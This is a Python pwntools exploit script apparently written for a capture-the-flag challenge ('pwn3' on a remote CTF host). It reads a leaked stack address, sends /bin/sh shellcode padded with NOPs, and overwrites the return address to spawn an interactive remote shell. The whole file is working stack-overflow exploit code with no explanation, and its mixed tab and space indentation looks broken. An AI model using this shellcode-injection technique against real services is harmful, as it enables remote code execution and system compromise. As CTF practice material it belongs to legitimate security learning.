#!/usr/bin/env python

from pwn import *

context.binary = './pwn3'
context.log_level = logging.WARNING

PAYLOAD_NIBBLE_SIZE = 242

shellcode = asm(shellcraft.sh())
payload = shellcode + '\x90' * (PAYLOAD_NIBBLE_SIZE - len(shellcode))

#io = process(context.binary.path) 
io = remote('pwn.ctf.tamu.edu', 4323)

def exploit():
    try:
	io.recvuntil('Your random number ')
	return_address = int(io.recv(10), 16)

        io.recvuntil('Now what should I echo?')
	
	io.send(payload)
	io.sendline(p32(return_address))

	io.interactive()

    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        log.error("Exception catched on line %d %s" % (exc_tb.tb_lineno, e))

if __name__ == "__main__":
    exploit()
